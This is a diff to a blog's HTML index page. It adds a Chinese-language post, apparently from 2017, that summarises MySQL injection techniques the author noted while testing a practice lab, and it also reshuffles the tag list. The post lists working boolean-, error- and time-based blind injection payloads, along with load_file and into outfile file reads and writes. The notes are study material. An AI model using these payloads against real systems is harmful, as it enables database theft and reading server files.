@@ -149,6 +149,153 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-SQLi/sql" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/31/SQLi/sql/">SQLi</a>
+    </h1>
+  
+
+        
+        <a href="/2017/10/31/SQLi/sql/" class="archive-article-date">
+  	<time datetime="2017-10-31T13:06:42.904Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!--markdown-->
+<h2 id="记一次环境测试并总结下sql注入"><a href="#记一次环境测试并总结下sql注入" class="headerlink" title="记一次环境测试并总结下sql注入"></a>记一次环境测试并总结下sql注入</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近帮老板测试了下他的sql注入联系环境，刚好我也想看看《mysql-injection》,这本sql注入天书，然后总结下写点东西。</p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>一般的什么get、post、单引号之类的测试这里就不一一累述了，主要想记录总结下一些开始没怎么学懂的东西。</p>
+<h5 id="基于布尔sql盲注"><a href="#基于布尔sql盲注" class="headerlink" title="基于布尔sql盲注"></a>基于布尔sql盲注</h5><pre><code>1.`left(database(),1)&gt;\&apos;s\&apos;`
+</code></pre><blockquote>
+<p>left(a,b)从左侧截取a的前b位</p>
+<pre><code>2.`(ascii(substr((select flag from flag),1,1)))&gt;100 --+`
+</code></pre><p>substr(a,b,c)从c位置开始，截取字符串a的c长度<br>ascii()将某个字符转换为ascii值</p>
+</blockquote>
+<pre><code>3.`ord(mid((select ifnull(cast(username as char),0x20) from security.user order by id limit 0,1),1,1))&gt;98%23`
+</code></pre><blockquote>
+<p>mid(a,b,c)从位置b开始，截取a字符串的c位<br>ord()函数同ascii()，将字符转为ascii值<br>cast(a as b)将a转换为b类型<br>ifnull(a,b)a不是null就取a，是就取b</p>
+</blockquote>
+<pre><code>4.`select user() regexp \&apos;^[a-z]\&apos;;`
+</code></pre><blockquote>
+<p>正则表达式的用法,user()结果为root,regexp为匹配root的正则表达式。匹配正确为1，不正确为0。</p>
+</blockquote>
+<pre><code>5.`select user() like \&apos;ro%\&apos;`
+</code></pre><blockquote>
+<p>有则1，没有则0</p>
+</blockquote>
+<h5 id="基于报错的sql盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的sql盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的sql盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的sql盲注——构造payload让信息通过错误提示回显出来</h5><p>1.`    select 1,count(<em>),concat(0x3a,0X3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from infomation_schema.columns group by a;``</p>
+<blockquote>
+<p>一是concat计数，二是floor，取得0 or 1，进行数据重复，三是group by进行分组，原理好像<br><a href="http://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="external">http://www.cnblogs.com/xdans/p/5412468.html</a>这是一个好文，还有以下变形<br><code>select count(*) from information_schema.tables froup by concat(version(),floor(rand(0)*2))</code><br>如果关键点表被禁用了可以使用用户变量来报错<br>    <code>select min(@a=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code><br>2.<code>select exp(~(select * from (select user())a))</code><br>double数值类型超出范围<br>exp()为以e的底的对数函数:版本在5.5.5及其以上</p>
+</blockquote>
+<p>3.<code>select !(select * from (select user())x) - ~0</code></p>
+<blockquote>
+<p>bigint 超出范围：~0是对0逐位取反，版本在5.5.5及其以上</p>
+</blockquote>
+<p>4.<code>extractvalue(1,concat(0x7e,(select @@version),0x7e)) se</code></p>
+<blockquote>
+<p>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p>
+</blockquote>
+<p>5.<code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p>
+<blockquote>
+<p>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p>
+</blockquote>
+<p>6.<code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code></p>
+<blockquote>
+<p>mysql重复特征，此处重复了version，所以报错。</p>
+</blockquote>
+<p>#####基于时间的sql盲注<br>    1.<code>if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&gt;10,sleep(1),NULL)%23</code></p>
+<blockquote>
+<p>if(a,b,c) a假则执行b</p>
+</blockquote>
+<pre><code>2.`if(ascii(substring((SELECT flag FROM flag),1,1))=119,(select benchmark(10000000,md5(0x41))),1)%23`
+</code></pre><blockquote>
+<p>benchmark(a,b)执行b命令a次，算一种ddos推荐sleep</p>
+</blockquote>
+<p>#####load_file()和into outfile()<br>1.load_file()导出文件</p>
+<pre><code>`select 1,user(),load_file(\&apos;/var/www/html/db.php\&apos;)``
+</code></pre><p><code>load_file(file_name)</code>:读取文件并返回该文件的内容作为一个字符串。</p>
+<p>使用条件：</p>
+<ul>
+<li>必须有读取权限且文件必须完全可读</li>
+<li>欲读文件必须在服务器上</li>
+<li>必须指定文件完整路径(有些课报错爆出绝对路径)</li>
+<li>欲读取文件必须小于<code>max_allowed_packet</code></li>
+</ul>
+<blockquote>
+<p>可用char()编码后的代替</p>
+<p>或者直接16进制</p>
+<p>/用\\代替（win）</p>
+</blockquote>
+<p>2.文件导入到数据库<br>3.导入到文件<br><code>select...into outfile \&#39;filename\&#39;</code></p>
+<h5 id="万能密码就不细说了"><a href="#万能密码就不细说了" class="headerlink" title="万能密码就不细说了"></a>万能密码就不细说了</h5><p>注入方式和get型差不多</p>
+<p>手法和前文说的一样注入点不同而已</p>
+<h5 id="多语句"><a href="#多语句" class="headerlink" title="多语句"></a>多语句</h5><p>能多语句就随便搞嘛</p>
+<h5 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h5><p>前提是数据库对头信息进行了提取并处理</p>
+<p>常见位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- user-agent</div><div class="line">- cookie</div><div class="line">- referer</div></pre></td></tr></table></figure></p>
+<p>工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- live http headers(firefox)</div><div class="line"></div><div class="line">- tamper data(firefox)</div></pre></td></tr></table></figure></p>
+<p>手法和前文说的一样注入点不同而已</p>
+<h5 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h5><p>后面将新开一篇记录，在此就不累述了。</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这次记录了很多注入的手法，有常见的也有不怎么常见的，主要是很早就想好好地记录总结下sql了，借此机会就成热打铁写了这篇文章，其中借鉴不少天书的记录，后面会针对wafbypass做些收集并整理出来。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SQLi</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/10/31/SQLi/sql/">show all >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-something-interesting/myfound" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -650,14 +797,6 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">ssrf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">XXE</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
@@ -666,7 +805,7 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+                <a href="javascript:void(0)" class="js-tag color5">ssrf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -674,11 +813,15 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">uploadfile</a>
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">初探逆向</a>
+                <a href="javascript:void(0)" class="js-tag color4">XXE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">uploadfile</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -687,6 +830,10 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">环境配置</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">初探逆向</a>
               </li>
             
             <div class="clearfix"></div>
